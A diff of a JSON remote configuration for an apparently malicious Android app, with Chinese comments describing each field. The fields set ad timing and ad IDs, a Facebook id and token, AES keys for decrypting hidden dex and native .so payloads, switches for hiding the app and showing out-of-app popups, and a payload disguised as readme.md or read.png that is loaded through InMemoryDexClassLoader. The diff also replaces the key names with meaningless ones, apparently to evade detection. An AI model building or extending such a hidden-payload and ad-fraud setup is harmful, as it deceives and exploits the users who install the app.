@@ -1,41 +1,34 @@
 A:
 {
-"date_show": "60-60",
-"lit_po": "1000",
-"vf_rg": "ppd",
-"uyx": "kapa",
-"vmkfs": "3616318175247400-3616318175247400",
-"m_d_v": "",
-"n_t_v": "30-30-8-16-80-500-800-10-1500",
-"vmfk_a_i": "981772962-981772963",
-"jia_kf": "DKs2s4G3hffj3ke3",
-"wt_kk": "MKvf7G8Fjke4Fkm5",
-"mkri_ce": "peektalk-tssf-tellnc-hitree",
-"domo_so": "readme.md-AES-dalvik.system.InMemoryDexClassLoader-com.clean.dependency.Core-a"
+"jimi_yei": "60-60-1000",
+"nojack": "thing-mei",
+"dixier": "3616318175247400-3616318175247400",
+"kaipudu": "",
+"new_kapa": "30-30-8-16-80-500-800-10-1500",
+"aikenoka": "981772962-981772963",
+"one_line": "DKs2s4G3hffj3ke3",
+"dimosh": "MKvf7G8Fjke4Fkm5",
+"verimrop": "peektalk-tssf-tellnc-hitree",
+"allcango": "read.png-AES-dalvik.system.InMemoryDexClassLoader-com.hightway.tell.peek.Core-a"
 }
 
-B: {
-"date_show": "60-60",
-"lit_po": "1000",
-"vf_rg": "ppd",
-"uyx": "cace",
-"vmkfs": "3616318175247400-3616318175247400",
-"m_d_v":""
+B:
+{
+"jimi_yei": "60-60-1000",
+"nojack": "some-mei",
+"dixier": "3616318175247400-3616318175247400",
+"kaipudu": ""
 }
 
 {
-//A配置刷新间隔 单位分钟;B配置刷新间隔 单位秒;
-"date_show": "60-60",
-//Admin请求上线
-"lit_po": "1000",
-//日志必传埋点,ppd上报，其他不上报
-"vf_rg": "ppd",
-//用户A(kapa),用户B(cace)
-"uyx": "kapa",
+//A配置刷新间隔 单位分钟;B配置刷新间隔 单位秒;Admin请求上线
+"jimi_yei": "60-60-1000",
+//用户A(thing),用户B(some),日志必传埋点,mei上报，其他不上报
+"nojack": "thing-mei",
 // Facebook id和Facebook token（-号隔开）
-"vmkfs": "3616318175247400-3616318175247400",
+"dixier": "3616318175247400-3616318175247400",
 //新增用户属性
-"m_d_v": "",
+"kaipudu": "",
 // B配置都不要下面的数据
 //广告检测间隔、定时触发间隔 单位秒,
 //广告显示间隔 单位秒,
@@ -46,17 +39,17 @@ B: {
 //延迟显示结束时间单位毫秒 配置0 则取消延迟
 //定时随机配置不能小于定时配置 单位秒
 // 循环监测是否解锁，单位毫秒
-"n_t_v": "30-30-8-16-80-500-800-10-1500",
+"new_kapa": "30-30-8-16-80-500-800-10-1500",
 // 广告id1 -广告id2
-"vmfk_a_i": "981772962-981772963",
+"aikenoka": "981772962-981772963",
 // 解密dex的key
-"jia_kf": "DKs2s4G3hffj3ke3",
+"one_line": "DKs2s4G3hffj3ke3",
 // 解密so的key
-"wt_kk": "MKvf7G8Fjke4Fkm5",
+"dimosh": "MKvf7G8Fjke4Fkm5",
 // 隐藏/外弹/广播/文件开关 和So的信息依依对应
-"mkri_ce": "peektalk-tssf-tellnc-hitree",
+"verimrop": "peektalk-tssf-tellnc-hitree",
 //文件名，加密方式，InMemoryDexClassLoader路径，调用dex方法路径，调用dex方法名，用-号隔开
-"domo_so": "readme.md-AES-dalvik.system.InMemoryDexClassLoader-com.clean.dependency.Core-a"
+"allcango": "read.png-AES-dalvik.system.InMemoryDexClassLoader-com.hightway.tell.peek.Core-a"
 }
 
 //android.os.Build.VERSION_CODES.Q
